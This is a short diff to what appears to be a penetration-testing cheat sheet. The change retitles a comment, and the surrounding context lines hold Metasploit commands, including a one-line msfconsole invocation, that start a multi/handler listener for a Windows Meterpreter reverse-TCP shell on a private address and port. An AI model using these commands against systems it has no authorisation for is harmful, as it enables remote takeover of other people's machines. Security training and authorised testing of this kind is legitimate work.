@@ -26,7 +26,7 @@ msf5>set lport
 msf5> set ExitOnSession false  
 msf5>exploit -j  
 
-# One-Liner:
+# One-Liner for listener endpoint:
 msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost 192.168.45.234; set lport 7777; set ExitOnSession false; exploit -j"
 
 #  Windows Payloads
